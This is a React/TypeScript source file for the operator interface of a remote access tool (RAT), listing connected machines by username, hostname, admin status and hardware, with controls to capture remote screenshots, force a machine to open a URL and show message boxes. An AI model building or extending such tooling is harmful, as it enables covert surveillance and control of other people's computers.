import { IconServer, IconSquareRoundedX } from "@tabler/icons-react";
import React, { useEffect, useState, useContext } from "react";
import { RATContext } from "../rat/RATContext";
import {
  visitWebsiteCmd,
  testMessageBoxCmd,
  sendMessageBoxCmd,
  takeScreenshotCmd,
} from "../rat/RATCommands";

import { ContextMenu } from "../components/ContextMenu";

import { RATClient } from "../../types";

import { ContextMenuType } from "../../types";

import windowsImg from "../assets/732225.png";
import linuxImg from "../assets/pngimg.com - linux_PNG1.png";
import { listen } from "@tauri-apps/api/event";

function ClientDetails({
  client,
  onClose,
}: {
  client: RATClient | null;
  onClose: () => void;
}) {
  if (!client) return null;

  const [screenshot, setScreenshot] = useState<string | null>(null);
  const [openedModal, setOpenedModal] = useState<string | null>(null);

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Escape") {
        onClose();
      }
    };

    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [onClose]);

  async function waitScreenshot() {
    listen("client_screenshot", (event) => {
      setScreenshot(event.payload as string);
    });
  }

  useEffect(() => {
    waitScreenshot();
  }, []);

  async function takeScreenshot(client: RATClient, display: number) {
    await takeScreenshotCmd(client.addr, display);
  }

  return (
    <div className="relative bg-secondarybg p-4 rounded-xl text-white">
      {/* X button */}
      <button
        onClick={onClose}
        className="absolute top-3 right-3 text-accentx hover:text-white transition cursor-pointer"
        aria-label="Close details"
      >
        <IconSquareRoundedX size={32} />
      </button>

      <h2 className="text-lg font-bold mb-2">{client.addr}</h2>

      <div className="mt-4 mb-4">
        <div className="screenshot w-full aspect-[16/9] border border-accentx rounded-xl flex items-center justify-center">
          {screenshot ? (
            <img
              src={`data:image/png;base64,${screenshot}`}
              alt="Screenshot"
              className="h-full rounded-xl"
            />
          ) : (
            <div className="w-full h-full animate-pulse bg-accentx rounded-md" />
          )}
        </div>
      </div>

      <div className="flex flex-row gap-2 mb-2">
        {client &&
          [...Array(client.displays).keys()].map((index) => (
            <a
              key={index}
              onClick={() => takeScreenshot(client, index)}
              className="cursor-pointer rounded-full px-4 py-1.5 border border-accentx bg-secondarybg text-white hover:bg-white hover:text-black transition"
            >
              Capture Display {index}
            </a>
          ))}
      </div>

      <p>
        <span className="text-accentx">OS:</span> {client.os}
      </p>
      <p>
        <span className="text-accentx">Username:</span> {client.username}
      </p>
      <p>
        <span className="text-accentx">Account Type:</span>{" "}
        {client.is_elevated ? "Admin" : "User"}
      </p>
      <p>
        <span className="text-accentx">CPU:</span> {client.cpu}
      </p>
      <p>
        <span className="text-accentx">GPU:</span>
        <br />
        {client.gpus}
      </p>
      <p>
        <span className="text-accentx">RAM:</span> {client.ram}
      </p>
      <p>
        <span className="text-accentx">Drives:</span> {client.storage}
      </p>
    </div>
  );
}

export const Clients = () => {
  const [selectedClient, setSelectedClient] = useState<string>("");
  const [selectedClientDetails, setSelectedClientDetails] =
    useState<RATClient | null>(null);
  const { clientList, fetchClients, running } = useContext(RATContext)!;
  const [contextMenu, setContextMenu] = useState<ContextMenuType | null>(null);

  const [url, setUrl] = useState<string>("");

  const [messageBoxTitle, setMessageBoxTitle] = useState<string>("");
  const [messageBoxContent, setMessageBoxContent] = useState<string>("");
  const [messageBoxButton, setMessageBoxButton] =
    useState<string>("abort_retry_ignore");
  const [messageBoxIcon, setMessageBoxIcon] = useState<string>("error");

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Escape") {
        setContextMenu(null);
      }
    };

    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [contextMenu]);

  const handleContextMenu = (
    event: React.MouseEvent<HTMLDivElement, MouseEvent>,
    addr: string,
    clientFullName: string
  ) => {
    event.preventDefault();
    setSelectedClient(addr);
    setContextMenu({
      x: event.pageX,
      y: event.pageY,
      addr: addr,
      clientFullName,
    });
  };

  const handleVisitWebsite = () => {
    visitWebsiteCmd(String(selectedClient), url);
    (
      document.getElementById("visit_website_modal") as HTMLDialogElement
    ).close();
    setSelectedClient("");
    setSelectedClientDetails(null);
    setUrl("");
  };

  const handleClose = () => {
    setContextMenu(null);
  };

  useEffect(() => {
    if (!running) return;
    fetchClients();
  }, [running]);

  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      const target = event.target as HTMLElement;
      if (contextMenu && !target.closest(".context-menu")) {
        setContextMenu(null);
      }
    };

    document.addEventListener("mousedown", handleClickOutside);

    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    };
  }, [contextMenu]);

  const fetchGpus = (gpus: string[]) => {
    let gpuString = "";

    gpus.forEach((gpu) => {
      gpuString += `${gpu}\n`;
    });

    return gpuString;
  };

  useEffect(() => {
    if (!clientList.some((client) => client.addr === selectedClient)) {
      setSelectedClient("");
      setSelectedClientDetails(null);
    }
  }, [clientList, selectedClient]);

  return (
    <>
      <dialog id="message_box_modal" className="modal">
        <div className="modal-box w-100 bg-primarybg text-white border border-accentx rounded-2xl">
          <h3 className="font-bold text-lg">Show MessageBox</h3>

          <div className="form-control mt-4">
            <label className="input input-bordered flex items-center gap-2 border-accentx bg-secondarybg rounded-3xl">
              <input
                type="text"
                placeholder="Title"
                className="grow"
                value={messageBoxTitle}
                onChange={(e) => setMessageBoxTitle(e.target.value)}
              />
            </label>
          </div>

          <div className="form-control mt-3">
            <label className="input input-bordered flex items-center gap-2 border-accentx bg-secondarybg rounded-3xl">
              <input
                type="text"
                placeholder="Content"
                className="grow"
                value={messageBoxContent}
                onChange={(e) => setMessageBoxContent(e.target.value)}
              />
            </label>
          </div>

          <div className="form-control mt-3">
            <select
              className="select select-bordered border-accentx bg-secondarybg rounded-3xl"
              value={messageBoxButton}
              onChange={(e) => setMessageBoxButton(e.target.value)}
            >
              <option value="abort_retry_ignore">AbortRetryIgnore</option>
              <option value="ok">OK</option>
              <option value="ok_cancel">OKCancel</option>
              <option value="retry_cnacel">RetryCancel</option>
              <option value="yes_no">YesNo</option>
              <option value="yes_no_cancel">YesNoCancel</option>
            </select>
          </div>

          <div className="form-control mt-3">
            <select
              className="select select-bordered border-accentx bg-secondarybg rounded-3xl"
              value={messageBoxIcon}
              onChange={(e) => setMessageBoxIcon(e.target.value)}
            >
              <option value="error">Error</option>
              <option value="question">Question</option>
              <option value="warning">Warning</option>
              <option value="info">Information</option>
              <option value="asterisk">Asterisk</option>
            </select>
          </div>

          <div className="flex flex-row gap-2 mt-4">
            <span
              onClick={() =>
                testMessageBoxCmd(
                  messageBoxTitle,
                  messageBoxContent,
                  messageBoxButton,
                  messageBoxIcon
                )
              }
              className="w-18 btn bg-secondarybg text-white border border-accentx rounded-3xl hover:bg-white hover:text-black transition"
            >
              Test
            </span>
            <span
              onClick={() =>
                sendMessageBoxCmd(
                  String(selectedClient),
                  messageBoxTitle,
                  messageBoxContent,
                  messageBoxButton,
                  messageBoxIcon
                )
              }
              className="w-18 btn bg-secondarybg text-white border border-accentx rounded-3xl hover:bg-white hover:text-black transition"
            >
              Send
            </span>
          </div>
        </div>

        <form method="dialog" className="modal-backdrop">
          <button>close</button>
        </form>
      </dialog>

      <dialog id="visit_website_modal" className="modal">
        <div className="modal-box bg-primarybg text-white w-80 border border-accentx rounded-2xl">
          <h3 className="font-bold text-lg">Visit Website</h3>
          <div className="form-control mt-4 flex flex-col">
            <label className="rounded-3xl pl-4 input input-bordered flex items-center gap-2 border-accentx bg-secondarybg">
              URL
              <input
                type="text"
                placeholder="https://example.com"
                className="grow"
                value={url}
                onChange={(e) => setUrl(e.target.value)}
              />
            </label>

            <span
              onClick={() => handleVisitWebsite()}
              className="w-32 btn mt-4 bg-secondarybg text-white border border-accentx rounded-3xl hover:bg-white hover:text-black transition"
            >
              Visit Website
            </span>
          </div>
        </div>

        <form method="dialog" className="modal-backdrop">
          <button>close</button>
        </form>
      </dialog>

      <div className="flex flex-row h-full">
        <div className="flex-1 overflow-auto bg-secondarybg text-black rounded-2xl px-4 sm:px-6 lg:px-8">
          <div className="flow-root">
            <div className="-mx-4 -my-2 sm:-mx-6 lg:-mx-8">
              <div className="inline-block min-w-full py-2 align-middle">
                <table className="min-w-full border-separate border-spacing-0">
                  <thead>
                    <tr>
                      <th
                        scope="col"
                        className="sticky top-0 z-10 border-b  bg-white/90 py-3.5 pr-3 pl-4 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter sm:pl-6 lg:pl-8"
                      >
                        Address
                      </th>
                      <th
                        scope="col"
                        className="sticky top-0 z-10 hidden border-b  bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter sm:table-cell"
                      >
                        PC Name
                      </th>
                      <th
                        scope="col"
                        className="sticky top-0 z-10 hidden border-b  bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter lg:table-cell"
                      >
                        Account Type
                      </th>
                      <th
                        scope="col"
                        className="sticky top-0 z-10 border-b  bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter"
                      >
                        Operating System
                      </th>
                      <th
                        scope="col"
                        className="sticky top-0 z-10 border-b  bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter"
                      >
                        Hardware
                      </th>
                    </tr>
                  </thead>
                  <tbody>
                    {clientList && clientList.length > 0 && (
                      <>
                        {clientList.map((client) => (
                          <tr
                            key={client.addr}
                            onContextMenu={(e) =>
                              handleContextMenu(
                                e,
                                client.addr,
                                `${client.username}@${client.hostname}`
                              )
                            }
                            onClick={() => setSelectedClientDetails(client)}
                            className={`cursor-pointer transition hover:bg-[#1f1f1f] ${
                              selectedClientDetails === client
                                ? "bg-[#2a2a2a]"
                                : ""
                            }`}
                          >
                            <td className="border-b border-accentx py-4 pr-3 pl-4 font-medium whitespace-nowrap text-white sm:pl-6 lg:pl-8">
                              {client.addr}
                            </td>
                            <td className="hidden border-b border-accentx px-3 py-4 whitespace-nowrap text-white sm:table-cell">
                              <div className="flex items-center gap-3">
                                <img
                                  className="w-4"
                                  src={
                                    client.os.includes("Windows")
                                      ? windowsImg
                                      : linuxImg
                                  }
                                  alt="OS"
                                />
                                {client.username}@{client.hostname}
                              </div>
                            </td>
                            <td className="hidden border-b border-accentx px-3 py-4 whitespace-nowrap text-white lg:table-cell">
                              {client.is_elevated ? "Admin" : "User"}
                            </td>
                            <td className="border-b border-accentx px-3 py-4 whitespace-nowrap text-white">
                              {client.os}
                            </td>
                            <td className="border-b border-accentx px-3 py-4 whitespace-nowrap text-white">
                              <div className="flex items-center gap-2">
                                <IconServer size={20} />
                                <IconServer size={20} />
                                <IconServer size={20} />
                                <IconServer size={20} />
                              </div>
                            </td>
                          </tr>
                        ))}
                      </>
                    )}

                    {/* {clients.map((client) => (
                    
                  ))} */}
                  </tbody>
                </table>
                {contextMenu && (
                  <ContextMenu
                    x={contextMenu.x}
                    y={contextMenu.y}
                    addr={contextMenu.addr}
                    onClose={handleClose}
                    clientFullName={contextMenu.clientFullName}
                  />
                )}
              </div>
            </div>
          </div>
        </div>

        {/* Details panel */}
        <div
          className={`w-100 p-2 ${selectedClientDetails ? "block" : "hidden"}`}
        >
          {selectedClientDetails && (
            <ClientDetails
              client={selectedClientDetails}
              onClose={() => setSelectedClientDetails(null)}
            />
          )}
        </div>
      </div>
    </>
  );
};
